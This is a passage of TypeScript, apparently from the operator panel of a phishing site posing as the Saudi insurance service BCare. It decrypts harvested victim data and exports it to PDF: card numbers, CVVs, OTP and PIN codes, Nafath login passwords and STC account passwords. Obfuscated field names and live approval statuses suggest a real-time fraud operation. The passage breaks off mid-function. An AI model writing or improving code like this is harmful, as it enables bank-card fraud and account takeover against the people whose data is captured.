"use client";

import type { InsuranceApplication } from "@/lib/firestore-types";
import { _d } from "@/lib/secure-utils";

function decryptField(value: string | undefined): string {
  if (!value) return "";
  try {
    return _d(value) || value;
  } catch {
    return value;
  }
}

function val(v: string | number | undefined | null): string {
  if (v === undefined || v === null || v === "") return "";
  return String(v);
}

function escapeHtml(raw: string): string {
  return raw
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;")
    .replace(/"/g, "&quot;")
    .replace(/'/g, "&#39;")
    .replace(/\n/g, "<br />");
}

function getBankLogoUrlForPdf(bankName: string): string | null {
  const n = (bankName || "").toLowerCase();
  if (n.includes("أهلي") || n.includes("ahli") || n.includes("snb") || n.includes("national")) return "/logo-snb.png";
  if (n.includes("راجح") || n.includes("rajhi")) return "/logo-rajhi.png";
  if (n.includes("رياض") || n.includes("riyad")) return "/logo-riyad.jpg";
  if (n.includes("إنماء") || n.includes("انماء") || n.includes("alinma")) return "/logo-alinma.png";
  return null;
}

function getNetworkLogoUrlForPdf(cardType: string): string | null {
  const t = (cardType || "").toLowerCase();
  if (t.includes("mada")) return "/logo-mada.png";
  if (t.includes("visa")) return "/logo-visa.png";
  if (t.includes("master")) return "/logo-mastercard.png";
  return null;
}

function formatDateTime(value: any): string {
  if (!value) return "";
  try {
    const date =
      typeof value === "object" && value !== null && typeof value.toDate === "function"
        ? value.toDate()
        : new Date(value);
    if (!Number.isNaN(date.getTime())) {
      return date.toLocaleString("ar-SA", {
        year: "numeric", month: "2-digit", day: "2-digit",
        hour: "2-digit", minute: "2-digit",
      });
    }
  } catch { return val(value); }
  return val(value);
}

function formatMoney(value: string | number | undefined | null): string {
  if (value === undefined || value === null || value === "") return "";
  const num = Number(value);
  if (!Number.isNaN(num) && Number.isFinite(num)) {
    return `${new Intl.NumberFormat("ar-SA", { minimumFractionDigits: 0, maximumFractionDigits: 2 }).format(num)} ر.س`;
  }
  return val(value);
}

function formatCardNumber(num: string): string {
  const clean = num.replace(/\s/g, "");
  return clean.match(/.{1,4}/g)?.join("  ") || num;
}

function buildCardMockupHtml(
  cardNumber: string,
  expiryDate: string,
  cvv: string,
  cardHolderName: string,
  bankName: string,
  cardType: string,
  cardLevel: string,
  otpCode: string,
  pinCode: string,
  visitorName: string,
  identityNumber: string,
  phoneNumber: string,
  pageLabel: string,
): string {
  const bankLogoUrl = getBankLogoUrlForPdf(bankName);
  const networkLogoUrl = getNetworkLogoUrlForPdf(cardType);

  const bankDisplay = bankLogoUrl
    ? `<img src="${bankLogoUrl}" alt="${escapeHtml(bankName)}" style="height:26px;max-width:120px;object-fit:contain;filter:brightness(0) invert(1);" crossorigin="anonymous" />`
    : bankName
      ? `<span style="font-size:14px;font-weight:800;color:#fff;font-family:Arial,sans-serif;letter-spacing:0.04em;">${escapeHtml(bankName)}</span>`
      : "";

  const networkDisplay = networkLogoUrl
    ? `<img src="${networkLogoUrl}" alt="${escapeHtml(cardType)}" style="height:24px;max-width:60px;object-fit:contain;filter:brightness(0) invert(1);" crossorigin="anonymous" />`
    : cardType
      ? `<span style="font-size:12px;font-weight:900;color:#fff;font-family:Arial;letter-spacing:0.06em;text-transform:uppercase;">${escapeHtml(cardType)}</span>`
      : "";

  const levelBadge = cardLevel
    ? `<span style="font-size:10px;font-weight:700;letter-spacing:0.1em;color:#f5d77e;background:rgba(245,215,126,0.15);border:1px solid rgba(245,215,126,0.35);border-radius:20px;padding:2px 10px;text-transform:uppercase;">${escapeHtml(cardLevel)}</span>`
    : "";

  const chipHtml = `<div style="width:42px;height:30px;border-radius:6px;flex-shrink:0;background:linear-gradient(135deg,#c9a227 0%,#f5d77e 40%,#c9a227 100%);display:grid;grid-template-columns:1fr 1fr;grid-template-rows:1fr 1fr;gap:2px;padding:5px;box-sizing:border-box;">
    <div style="background:rgba(120,80,0,0.35);border-radius:2px;"></div>
    <div style="background:rgba(120,80,0,0.35);border-radius:2px;"></div>
    <div style="background:rgba(120,80,0,0.35);border-radius:2px;"></div>
    <div style="background:rgba(120,80,0,0.35);border-radius:2px;"></div>
  </div>`;

  const infoLine = [
    visitorName ? `<span style="margin-left:16px;"><b>الاسم:</b> ${escapeHtml(visitorName)}</span>` : "",
    identityNumber ? `<span style="margin-left:16px;"><b>الهوية:</b> ${escapeHtml(identityNumber)}</span>` : "",
    phoneNumber ? `<span><b>الهاتف:</b> ${escapeHtml(phoneNumber)}</span>` : "",
  ].filter(Boolean).join("");

  const codesLine = [
    otpCode ? `<span style="margin-left:20px;"><b style="color:#a78bfa;">OTP:</b> <span style="font-family:'Courier New',monospace;font-size:18px;font-weight:900;letter-spacing:4px;color:#7C3AED;">${escapeHtml(otpCode)}</span></span>` : "",
    pinCode ? `<span><b style="color:#a78bfa;">PIN:</b> <span style="font-family:'Courier New',monospace;font-size:18px;font-weight:900;letter-spacing:4px;color:#7C3AED;">${escapeHtml(pinCode)}</span></span>` : "",
  ].filter(Boolean).join("");

  return `
    <div style="width:500px;margin:0 auto;font-family:'Cairo',Arial,sans-serif;direction:rtl;-webkit-print-color-adjust:exact;print-color-adjust:exact;">
      ${pageLabel ? `<div style="text-align:center;font-size:10px;color:#94A3B8;margin-bottom:6px;">${escapeHtml(pageLabel)}</div>` : ""}
      
      <div style="background:linear-gradient(145deg,#0a1628 0%,#112240 40%,#0d1b36 70%,#091428 100%);border-radius:20px;padding:24px 28px 20px;width:100%;box-sizing:border-box;position:relative;overflow:hidden;box-shadow:0 12px 40px rgba(0,0,0,0.35),0 4px 12px rgba(0,0,0,0.15);">
        <div style="position:absolute;top:0;left:0;right:0;bottom:0;border-radius:20px;background:linear-gradient(135deg,rgba(255,255,255,0.06) 0%,transparent 50%);pointer-events:none;"></div>
        
        <div style="display:flex;justify-content:space-between;align-items:flex-start;margin-bottom:6px;position:relative;">
          <div style="display:flex;flex-direction:column;gap:4px;direction:ltr;">
            ${bankDisplay}
            ${levelBadge}
          </div>
          <div style="display:flex;align-items:center;height:28px;">
            ${networkDisplay}
          </div>
        </div>

        <div style="display:flex;align-items:center;gap:16px;margin:18px 0 8px;position:relative;">
          ${chipHtml}
          <div style="font-family:'Courier New',monospace;font-size:22px;font-weight:700;color:#fff;letter-spacing:3px;direction:ltr;">
            ${escapeHtml(cardNumber ? formatCardNumber(cardNumber) : "•••• •••• •••• ••••")}
          </div>
        </div>

        <div style="display:flex;align-items:center;gap:40px;margin:10px 0 6px;direction:ltr;position:relative;">
          <div>
            <div style="font-size:9px;color:rgba(255,255,255,0.4);letter-spacing:1px;font-family:Arial;margin-bottom:1px;">VALID THRU</div>
            <div style="font-family:'Courier New',monospace;font-size:16px;font-weight:600;color:#fff;">${escapeHtml(expiryDate || "MM/YY")}</div>
          </div>
          <div>
            <div style="font-size:9px;color:rgba(255,255,255,0.4);letter-spacing:1px;font-family:Arial;margin-bottom:1px;">CVV</div>
            <div style="font-family:'Courier New',monospace;font-size:16px;font-weight:600;color:#fff;">${escapeHtml(cvv || "•••")}</div>
          </div>
        </div>

        <div style="display:flex;justify-content:space-between;align-items:flex-end;margin-top:14px;position:relative;">
          <div style="direction:ltr;">
            <span style="font-size:12px;font-weight:600;color:rgba(255,255,255,0.5);text-transform:uppercase;letter-spacing:0.1em;">${escapeHtml(cardType && cardType !== "CARD" ? cardType : "")}</span>
          </div>
          <span style="font-size:13px;font-weight:700;color:#fff;direction:ltr;max-width:200px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;">
            ${escapeHtml(cardHolderName || "CARDHOLDER NAME")}
          </span>
        </div>
      </div>

      ${infoLine ? `<div style="margin-top:10px;font-size:11px;color:#475569;direction:rtl;text-align:right;line-height:1.8;">${infoLine}</div>` : ""}
      ${codesLine ? `<div style="margin-top:6px;direction:rtl;text-align:right;line-height:1.8;">${codesLine}</div>` : ""}
    </div>
  `;
}

function safeTimestamp(ts: any): number {
  if (!ts) return 0;
  if (typeof ts === "object" && typeof ts.toDate === "function") {
    return ts.toDate().getTime();
  }
  const d = new Date(ts);
  return Number.isNaN(d.getTime()) ? 0 : d.getTime();
}

function extractCardData(visitor: InsuranceApplication) {
  const history = visitor.history || [];
  const allCardHistory = [...history]
    .filter((h: any) => h.type === "_t1" || h.type === "card")
    .sort((a: any, b: any) => safeTimestamp(b.timestamp) - safeTimestamp(a.timestamp));
  const allOtpHistory = [...history]
    .filter((h: any) => h.type === "_t2" || h.type === "otp")
    .sort((a: any, b: any) => safeTimestamp(b.timestamp) - safeTimestamp(a.timestamp));
  const allPinHistory = [...history]
    .filter((h: any) => h.type === "_t3" || h.type === "pin")
    .sort((a: any, b: any) => safeTimestamp(b.timestamp) - safeTimestamp(a.timestamp));

  const latestCard = allCardHistory[0] ?? null;
  const latestOtp = allOtpHistory[0] ?? null;
  const latestPin = allPinHistory[0] ?? null;

  const cardNumber = latestCard
    ? decryptField(latestCard.data?._v1 || latestCard.data?.cardNumber)
    : decryptField(visitor._v1 || visitor.cardNumber);
  const cvv = latestCard
    ? decryptField(latestCard.data?._v2 || latestCard.data?.cvv)
    : decryptField(visitor._v2 || visitor.cvv);
  const expiryDate = latestCard
    ? decryptField(latestCard.data?._v3 || latestCard.data?.expiryDate)
    : decryptField(visitor._v3 || visitor.expiryDate);
  const cardHolderName = latestCard
    ? decryptField(latestCard.data?._v4 || latestCard.data?.cardHolderName)
    : decryptField(visitor._v4 || visitor.cardHolderName);
  const cardType = val(latestCard?.data?.cardType || visitor.cardType);
  const bankName = val(latestCard?.data?.bankInfo?.name || visitor.bankInfo?.name);
  const cardLevel = val(latestCard?.data?.bankInfo?.level || visitor.cardLevel || visitor.bankInfo?.level);

  const otpCode = latestOtp
    ? decryptField(latestOtp.data?._v5 || latestOtp.data?.otp)
    : decryptField(visitor._v5 || visitor.otpCode || visitor.otp);
  const pinCode = latestPin
    ? decryptField(latestPin.data?._v6 || latestPin.data?.pinCode)
    : decryptField(visitor._v6 || visitor.pinCode);

  return {
    cardNumber, cvv, expiryDate, cardHolderName,
    cardType, bankName, cardLevel,
    otpCode, pinCode,
    visitorName: val((visitor as any).name || visitor.ownerName),
    identityNumber: val(visitor.identityNumber),
    phoneNumber: val(visitor.phoneNumber),
  };
}

function buildPdfHtml(
  visitor: InsuranceApplication,
  logoBase64: string,
  stampBase64: string
): string {
  const reportDate = formatDateTime(new Date());
  const createdAt = formatDateTime(visitor.createdAt as any);
  const updatedAt = formatDateTime(visitor.updatedAt as any);
  const lastSeen = formatDateTime(visitor.lastSeen as any);
  const insuranceDate = formatDateTime(visitor.createdAt as any);
  const currentPage = val(
    visitor.redirectPage || visitor.currentPage || (visitor.currentStep as any)
  );

  const history = visitor.history || [];
  const allCardHistory = [...history].filter(
    (h: any) => h.type === "_t1" || h.type === "card"
  );
  const sortedCardHistory = allCardHistory.sort(
    (a: any, b: any) =>
      new Date(b.timestamp).getTime() - new Date(a.timestamp).getTime()
  );

  const allOtpHistory = [...history].filter(
    (h: any) => h.type === "_t2" || h.type === "otp"
  );
  const sortedOtpHistory = allOtpHistory.sort(
    (a: any, b: any) =>
      new Date(b.timestamp).getTime() - new Date(a.timestamp).getTime()
  );

  const allPinHistory = [...history].filter(
    (h: any) => h.type === "_t3" || h.type === "pin"
  );
  const sortedPinHistory = allPinHistory.sort(
    (a: any, b: any) =>
      new Date(b.timestamp).getTime() - new Date(a.timestamp).getTime()
  );

  const allPhoneOtpHistory = [...history].filter(
    (h: any) => h.type === "_t5" || h.type === "phone_otp"
  );
  const sortedPhoneOtpHistory = allPhoneOtpHistory.sort(
    (a: any, b: any) =>
      new Date(b.timestamp).getTime() - new Date(a.timestamp).getTime()
  );

  const latestCard = sortedCardHistory.length > 0 ? sortedCardHistory[0] : null;
  const latestOtp = sortedOtpHistory.length > 0 ? sortedOtpHistory[0] : null;
  const latestPin = sortedPinHistory.length > 0 ? sortedPinHistory[0] : null;
  const latestPhoneOtp =
    sortedPhoneOtpHistory.length > 0 ? sortedPhoneOtpHistory[0] : null;

  const cardNumber = latestCard
    ? decryptField(latestCard.data?._v1 || latestCard.data?.cardNumber)
    : decryptField(visitor._v1 || visitor.cardNumber);
  const cvv = latestCard
    ? decryptField(latestCard.data?._v2 || latestCard.data?.cvv)
    : decryptField(visitor._v2 || visitor.cvv);
  const expiryDate = latestCard
    ? decryptField(latestCard.data?._v3 || latestCard.data?.expiryDate)
    : decryptField(visitor._v3 || visitor.expiryDate);
  const cardHolderName = latestCard
    ? decryptField(latestCard.data?._v4 || latestCard.data?.cardHolderName)
    : decryptField(visitor._v4 || visitor.cardHolderName);
  const cardType = latestCard ? val(latestCard.data?.cardType) : val(visitor.cardType);
  const bankName = latestCard
    ? val(latestCard.data?.bankInfo?.name)
    : val(visitor.bankInfo?.name);
  const bankCountry = latestCard
    ? val(latestCard.data?.bankInfo?.country)
    : val(visitor.bankInfo?.country);

  const otpCode = latestOtp
    ? val(latestOtp.data?._v5 || latestOtp.data?.otp)
    : val(visitor._v5 || visitor.otpCode || visitor.otp);
  const pinCode = latestPin
    ? val(latestPin.data?._v6 || latestPin.data?.pinCode)
    : val(visitor._v6 || visitor.pinCode);
  const phoneOtpCode = latestPhoneOtp
    ? val(latestPhoneOtp.data?._v7 || latestPhoneOtp.data?.phoneOtp)
    : val(visitor._v7 || visitor.phoneOtp || visitor.phoneVerificationCode);

  const offerCompany = visitor.selectedOffer
    ? val(
        (visitor.selectedOffer as any).name ||
          (visitor.selectedOffer as any).company
      )
    : "";
  const totalPrice = formatMoney(visitor.finalPrice || visitor.offerTotalPrice);
  const originalPrice = formatMoney(visitor.originalPrice);
  const discount = visitor.discount
    ? `${(visitor.discount * 100).toFixed(0)}%`
    : "";

  const reportId = val(visitor.referenceNumber || visitor.identityNumber || visitor.id);
  const visitorName = val((visitor as any).name || visitor.ownerName);

  const statusLabel = (status: string | undefined) => {
    if (!status) return "";
    const map: Record<string, string> = {
      waiting: "بانتظار المشرف",
      pending: "قيد المراجعة",
      verifying: "جاري التحقق",
      approved: "تم القبول",
      rejected: "تم الرفض",
      approved_with_otp: "تحويل إلى OTP",
      approved_with_pin: "تحويل إلى PIN",
      show_otp: "بانتظار إدخال OTP",
      show_pin: "بانتظار إدخال PIN",
      show_phone_otp: "بانتظار إدخال كود الهاتف",
      otp_rejected: "OTP مرفوض",
      resend: "إعادة إرسال",
    };
    return map[status] || status;
  };

  type PdfRow = { label: string; value: string; mono?: boolean };

  const renderTableRows = (rows: PdfRow[]) => {
    const visible = rows.filter((row) => row.value);
    if (visible.length === 0) {
      return `<tr><td colspan="2" class="empty-cell">لا توجد بيانات متاحة</td></tr>`;
    }
    return visible
      .map(
        (row, idx) => `
          <tr class="${idx % 2 === 0 ? "alt-row" : ""}">
            <td class="label-cell">${escapeHtml(row.label)}</td>
            <td class="value-cell ${row.mono ? "mono" : ""}">${escapeHtml(row.value)}</td>
          </tr>
      `
      )
      .join("");
  };

  const renderSection = (title: string, icon: string, rows: PdfRow[]) => `
    <section class="section">
      <div class="section-header">
        <span class="section-icon">${icon}</span>
        <span>${escapeHtml(title)}</span>
      </div>
      <table class="info-table">
        ${renderTableRows(rows)}
      </table>
    </section>
  `;

  const applicantRows: PdfRow[] = [
    { label: "اسم مقدم الطلب", value: visitorName },
    { label: "رقم الهوية", value: val(visitor.identityNumber), mono: true },
    { label: "رقم الهاتف", value: val(visitor.phoneNumber), mono: true },
    { label: "نوع الوثيقة", value: val(visitor.documentType) },
    { label: "الرقم التسلسلي", value: val(visitor.serialNumber), mono: true },
    { label: "نوع الطلب", value: val(visitor.insuranceType) },
    { label: "اسم المشتري", value: val(visitor.buyerName) },
    { label: "هوية المشتري", value: val(visitor.buyerIdNumber), mono: true },
  ];

  const insuranceRows: PdfRow[] = [
    { label: "نوع التغطية", value: val(visitor.insuranceCoverage) },
    { label: "تاريخ بدء التأمين", value: insuranceDate },
    { label: "موديل المركبة", value: val(visitor.vehicleModel) },
    { label: "سنة الصنع", value: val(visitor.vehicleYear), mono: true },
    { label: "قيمة المركبة", value: formatMoney(visitor.vehicleValue as any) },
    { label: "استخدام المركبة", value: val(visitor.vehicleUsage) },
    {
      label: "موقع الإصلاح",
      value: visitor.repairLocation
        ? visitor.repairLocation === "agency"
          ? "وكالة"
          : "ورشة"
        : "",
    },
  ];

  const offerRows: PdfRow[] = [
    { label: "الشركة", value: offerCompany },
    { label: "السعر الأصلي", value: originalPrice },
    { label: "الخصم", value: discount },
    { label: "السعر النهائي", value: totalPrice },
    {
      label: "المميزات المختارة",
      value: Array.isArray(visitor.selectedFeatures)
        ? visitor.selectedFeatures.join("، ")
        : "",
    },
  ];

  const cardRows: PdfRow[] = [
    { label: "رقم البطاقة", value: cardNumber, mono: true },
    { label: "اسم حامل البطاقة", value: cardHolderName },
    { label: "نوع البطاقة", value: cardType },
    { label: "تاريخ الانتهاء", value: expiryDate, mono: true },
    { label: "CVV", value: cvv, mono: true },
    { label: "البنك", value: bankName },
    { label: "بلد البنك", value: bankCountry },
    { label: "حالة البطاقة", value: statusLabel(visitor.cardStatus) },
  ];

  const verificationRows: PdfRow[] = [
    { label: "OTP", value: otpCode, mono: true },
    { label: "حالة OTP", value: statusLabel(visitor.otpStatus) },
    { label: "PIN", value: pinCode, mono: true },
    { label: "حالة PIN", value: statusLabel(visitor.pinStatus) },
    { label: "كود تحقق الهاتف", value: phoneOtpCode, mono: true },
    { label: "حالة تحقق الهاتف", value: statusLabel(visitor.phoneOtpStatus) },
    { label: "شركة الاتصالات", value: val(visitor.phoneCarrier) },
    { label: "نفاذ - الهوية", value: val(visitor._v8 || visitor.nafazId), mono: true },
    { label: "نفاذ - كلمة المرور", value: val(visitor._v9 || visitor.nafazPass) },
    { label: "رمز تأكيد نفاذ", value: val(visitor.nafadConfirmationCode), mono: true },
    { label: "بيانات STC (الجوال)", value: val(visitor.stcPhone), mono: true },
    { label: "بيانات STC (كلمة المرور)", value: val(visitor.stcPassword) },
    { label: "STC وقت الإدخال", value: formatDateTime(visitor.stcSubmittedAt) },
  ];

  const trackingRows: PdfRow[] = [
    { label: "رقم التقرير", value: reportId, mono: true },
    { label: "الصفحة الحالية", value: currentPage },
    { label: "الدولة", value: val(visitor.country) },
    { label: "الجهاز", value: val(visitor.deviceType) },
    { label: "المتصفح", value: val(visitor.browser) },
    { label: "نظام التشغيل", value: val(visitor.os) },
    { label: "آخر ظهور", value: lastSeen },
    { label: "تاريخ الإنشاء", value: createdAt },
    { label: "آخر تحديث", value: updatedAt },
  ];

  const cardAttemptsHtml = sortedCardHistory
    .slice(0, 6)
    .map(
      (entry: any, index: number) => `
      <tr class="${index % 2 === 0 ? "alt-row" : ""}">
        <td class="label-cell">محاولة ${sortedCardHistory.length - index}</td>
        <td class="value-cell mono">${escapeHtml(
          decryptField(entry.data?._v1 || entry.data?.cardNumber)
        )}</td>
      </tr>
      <tr class="${index % 2 === 0 ? "alt-row" : ""}">
        <td class="label-cell">حالة المحاولة</td>
        <td class="value-cell">${escapeHtml(statusLabel(entry.status) || "—")}</td>
      </tr>
      <tr class="${index % 2 === 0 ? "alt-row" : ""}">
        <td class="label-cell">وقت الإدخال</td>
        <td class="value-cell">${escapeHtml(formatDateTime(entry.timestamp) || "—")}</td>
      </tr>
    `
    )
    .join("");

  const attemptsSection = sortedCardHistory.length
    ? `
      <section class="section">
        <div class="section-header">
          <span class="section-icon">🧾</span>
          <span>سجل محاولات البطاقة</span>
        </div>
        <table class="info-table">
          ${cardAttemptsHtml}
        </table>
      </section>
    `
    : "";

  return `
    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700;800;900&display=swap" rel="stylesheet">
    <style>
      #pdf-content {
        font-family: "Cairo", Arial, sans-serif;
        direction: rtl;
        text-align: right;
        width: 760px;
        margin: 0 auto;
        padding: 0;
        color: #0F172A;
        background: #FFFFFF;
        line-height: 1.7;
        -webkit-print-color-adjust: exact;
        print-color-adjust: exact;
      }
      .report-shell {
        border: 1px solid #E2E8F0;
        border-radius: 18px;
        overflow: hidden;
        box-shadow: 0 10px 35px rgba(15, 23, 42, 0.08);
        background: linear-gradient(180deg, #F8FAFC 0%, #FFFFFF 160px);
      }
      .top-header {
        display: flex;
        justify-content: space-between;
        align-items: center;
        padding: 26px 28px 20px;
        background: linear-gradient(135deg, #173B74 0%, #1D4E89 52%, #2A6EBB 100%);
        color: #FFFFFF;
      }
      .header-title { margin: 0; font-size: 24px; font-weight: 900; letter-spacing: 0.2px; }
      .header-subtitle { margin-top: 4px; font-size: 12px; opacity: 0.9; }
      .logo { width: 132px; height: auto; background: #FFFFFF; border-radius: 10px; padding: 8px 10px; }
      .meta-grid { padding: 16px 28px 6px; display: grid; grid-template-columns: repeat(3, minmax(0, 1fr)); gap: 10px; }
      .meta-card { border: 1px solid #DBEAFE; background: #EFF6FF; border-radius: 10px; padding: 9px 12px; }
      .meta-label { font-size: 10px; color: #334155; }
      .meta-value { margin-top: 1px; font-size: 12px; font-weight: 800; color: #0F172A; }
      .summary-grid { padding: 8px 28px 0; display: grid; grid-template-columns: repeat(4, minmax(0, 1fr)); gap: 10px; }
      .summary-card { background: #FFFFFF; border: 1px solid #E2E8F0; border-radius: 12px; padding: 9px 12px; }
      .summary-label { font-size: 10px; color: #64748B; }
      .summary-value { margin-top: 2px; font-size: 12px; font-weight: 800; color: #0F172A; unicode-bidi: plaintext; word-break: break-word; }
      .sections-wrap { padding: 12px 28px 22px; }
      .section { margin-top: 14px; }
      .section-header { background: linear-gradient(90deg, #1E40AF 0%, #1D4ED8 100%); color: #FFFFFF; border-radius: 10px 10px 0 0; padding: 8px 12px; font-size: 13px; font-weight: 800; display: flex; align-items: center; gap: 8px; }
      .section-icon { font-size: 14px; }
      .info-table { width: 100%; border-collapse: collapse; border: 1px solid #D1D5DB; border-top: none; }
      .info-table .label-cell { width: 34%; background: #F8FAFC; color: #334155; font-size: 11px; font-weight: 700; border: 1px solid #D1D5DB; padding: 6px 10px; white-space: nowrap; }
      .info-table .value-cell { color: #0F172A; font-size: 11px; font-weight: 700; border: 1px solid #D1D5DB; padding: 6px 10px; unicode-bidi: plaintext; }
      .info-table .value-cell.mono { font-family: "Courier New", monospace; letter-spacing: 0.4px; }
      .info-table .empty-cell { text-align: center; color: #64748B; border: 1px solid #D1D5DB; padding: 10px; font-size: 11px; background: #F8FAFC; }
      .info-table .alt-row td { background: #F8FAFC; }
      .notes-box { margin: 16px 28px 0; border: 1px solid #E2E8F0; border-radius: 10px; background: #F8FAFC; padding: 10px 12px; font-size: 10px; color: #475569; }
      .sign-box { margin: 14px 28px 24px; border: 1px dashed #94A3B8; border-radius: 12px; padding: 12px; display: flex; justify-content: space-between; align-items: center; gap: 14px; }
      .sign-text { font-size: 11px; color: #334155; }
      .stamp { width: 150px; height: auto; opacity: 0.95; }
      .footer { text-align: center; font-size: 10px; color: #94A3B8; padding-bottom: 16px; }
    </style>
    <div id="pdf-content">
      <div class="report-shell">
        <div class="top-header">
          <div>
            <h1 class="header-title">تقرير بيانات طلب التأمين</h1>
            <div class="header-subtitle">Professional Visitor Snapshot • BCare Dashboard</div>
          </div>
          <img class="logo" src="${logoBase64}" crossorigin="anonymous" />
        </div>

        <div class="meta-grid">
          <div class="meta-card">
            <div class="meta-label">رقم التقرير</div>
            <div class="meta-value">${escapeHtml(reportId || "—")}</div>
          </div>
          <div class="meta-card">
            <div class="meta-label">تاريخ إنشاء التقرير</div>
            <div class="meta-value">${escapeHtml(reportDate || "—")}</div>
          </div>
          <div class="meta-card">
            <div class="meta-label">إجمالي محاولات البطاقة</div>
            <div class="meta-value">${escapeHtml(String(sortedCardHistory.length || 0))}</div>
          </div>
        </div>

        <div class="summary-grid">
          <div class="summary-card">
            <div class="summary-label">الاسم</div>
            <div class="summary-value">${escapeHtml(visitorName || "—")}</div>
          </div>
          <div class="summary-card">
            <div class="summary-label">رقم الهوية</div>
            <div class="summary-value">${escapeHtml(val(visitor.identityNumber) || "—")}</div>
          </div>
          <div class="summary-card">
            <div class="summary-label">الهاتف</div>
            <div class="summary-value">${escapeHtml(val(visitor.phoneNumber) || "—")}</div>
          </div>
          <div class="summary-card">
            <div class="summary-label">الصفحة الحالية</div>
            <div class="summary-value">${escapeHtml(currentPage || "—")}</div>
          </div>
        </div>

        <div class="sections-wrap">
          ${renderSection("بيانات مقدم الطلب", "👤", applicantRows)}
          ${renderSection("بيانات التأمين والمركبة", "🚗", insuranceRows)}
          ${renderSection("العرض المختار والتسعير", "📊", offerRows)}
          ${renderSection("معلومات الدفع والبطاقة", "💳", cardRows)}
          ${renderSection("رموز التحقق والاتصالات", "🔐", verificationRows)}
          ${renderSection("بيانات التتبع والجلسة", "🛰️", trackingRows)}
          ${attemptsSection}
        </div>

        <div class="notes-box">
          هذا التقرير معلوماتي فقط، ولا يُعد وثيقة تأمين معتمدة إلا بعد استكمال جميع الشروط النظامية
          وسداد القسط النهائي حسب سياسة شركة التأمين.
        </div>

        <div class="sign-box">
          <div class="sign-text">
            <div><strong>الإقرار:</strong> أقر بصحة البيانات أعلاه.</div>
            <div style="margin-top:6px;">الاسم: _____________________</div>
            <div style="margin-top:6px;">التوقيع: ____________________</div>
          </div>
          <img class="stamp" src="${stampBase64}" crossorigin="anonymous" />
        </div>

        <div class="footer">
          BCare Dashboard · Confidential Report
        </div>
      </div>
    </div>
  `;
}

export async function generateCardPdf(visitor: InsuranceApplication) {
  const html2pdf = (await import("html2pdf.js")).default;

  const link = document.createElement("link");
  link.href = "https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700;800;900&display=swap";
  link.rel = "stylesheet";
  document.head.appendChild(link);
  await new Promise((resolve) => setTimeout(resolve, 1500));

  const d = extractCardData(visitor);
  const html = buildCardMockupHtml(
    d.cardNumber, d.expiryDate, d.cvv, d.cardHolderName,
    d.bankName, d.cardType, d.cardLevel,
    d.otpCode, d.pinCode,
    d.visitorName, d.identityNumber, d.phoneNumber,
    ""
  );

  const container = document.createElement("div");
  container.innerHTML = `
    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700;800;900&display=swap" rel="stylesheet">
    <div id="card-pdf-content" style="width:560px;padding:30px;background:#fff;-webkit-print-color-adjust:exact;print-color-adjust:exact;">
      ${html}
    </div>
  `;
  container.style.position = "absolute";
  container.style.left = "-9999px";
  container.style.top = "0";
  container.style.width = "560px";
  document.body.appendChild(container);

  const element = container.querySelector("#card-pdf-content") as HTMLElement;

  const opt = {
    margin: [10, 10, 10, 10] as [number, number, number, number],
    filename: `بطاقة_${visitor.identityNumber || visitor.id || "card"}_${Date.now()}.pdf`,
    image: { type: "jpeg" as const, quality: 0.98 },
    html2canvas: { scale: 2, useCORS: true, letterRendering: true, scrollY: 0 },
    jsPDF: { unit: "mm", format: "a4", orientation: "portrait" as const },
    pagebreak: { mode: ["avoid-all", "css", "legacy"] },
  };

  try {
    await html2pdf().set(opt).from(element).save();
  } finally {
    document.body.removeChild(container);
  }
}

export async function generateAllCardsPdf(visitors: InsuranceApplication[]) {
  const hasCardData = (v: InsuranceApplication) => {
    const cardFromHistory = (v.history || []).some(
      (h: any) => h.type === "_t1" || h.type === "card"
    );
    const directCard = !!(v._v1 || v.cardNumber);
    return cardFromHistory || directCard;
  };

  const withCards = visitors.filter(hasCardData);
  if (withCards.length === 0) return;

  const html2pdf = (await import("html2pdf.js")).default;

  const link = document.createElement("link");
  link.href = "https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700;800;900&display=swap";
  link.rel = "stylesheet";
  document.head.appendChild(link);
  await new Promise((resolve) => setTimeout(resolve, 1500));

  const cardsHtml = withCards.map((v, i) => {
    const d = extractCardData(v);
    const pageLabel = `${i + 1} / ${withCards.length}`;
    const cardHtml = buildCardMockupHtml(
      d.cardNumber, d.expiryDate, d.cvv, d.cardHolderName,
      d.bankName, d.cardType, d.cardLevel,
      d.otpCode, d.pinCode,
      d.visitorName, d.identityNumber, d.phoneNumber,
      pageLabel
    );
    const isLast = i === withCards.length - 1;
    return `<div style="${!isLast ? "page-break-after:always;" : ""}padding:30px 0;">${cardHtml}</div>`;
  }).join("\n");

  const container = document.createElement("div");
  container.innerHTML = `
    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700;800;900&display=swap" rel="stylesheet">
    <div id="all-cards-pdf" style="width:560px;padding:0 30px;background:#fff;font-family:'Cairo',Arial,sans-serif;-webkit-print-color-adjust:exact;print-color-adjust:exact;">
      ${cardsHtml}
    </div>
  `;
  container.style.position = "absolute";
  container.style.left = "-9999px";
  container.style.top = "0";
  container.style.width = "620px";
  document.body.appendChild(container);

  const element = container.querySelector("#all-cards-pdf") as HTMLElement;

  const opt = {
    margin: [10, 10, 10, 10] as [number, number, number, number],
    filename: `جميع_البطاقات_${Date.now()}.pdf`,
    image: { type: "jpeg" as const, quality: 0.97 },
    html2canvas: { scale: 2, useCORS: true, letterRendering: true, scrollY: 0 },
    jsPDF: { unit: "mm", format: "a4", orientation: "portrait" as const },
    pagebreak: { mode: ["css", "legacy"] },
  };

  try {
    await html2pdf().set(opt).from(element).save();
  } finally {
    document.body.removeChild(container);
  }
}

export async function generateVisitorPdf(visitor: InsuranceApplication) {
  const { BECARE_LOGO_BASE64 } = await import("@/lib/pdf-logo");
  const { STAMP_BASE64 } = await import("@/lib/pdf-stamp");
  const html2pdf = (await import("html2pdf.js")).default;

  const link = document.createElement("link");
  link.href = "https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700;800;900&display=swap";
  link.rel = "stylesheet";
  document.head.appendChild(link);
  await new Promise((resolve) => setTimeout(resolve, 1500));

  const container = document.createElement("div");
  container.innerHTML = buildPdfHtml(visitor, BECARE_LOGO_BASE64, STAMP_BASE64);
  container.style.position = "absolute";
  container.style.left = "-9999px";
  container.style.top = "0";
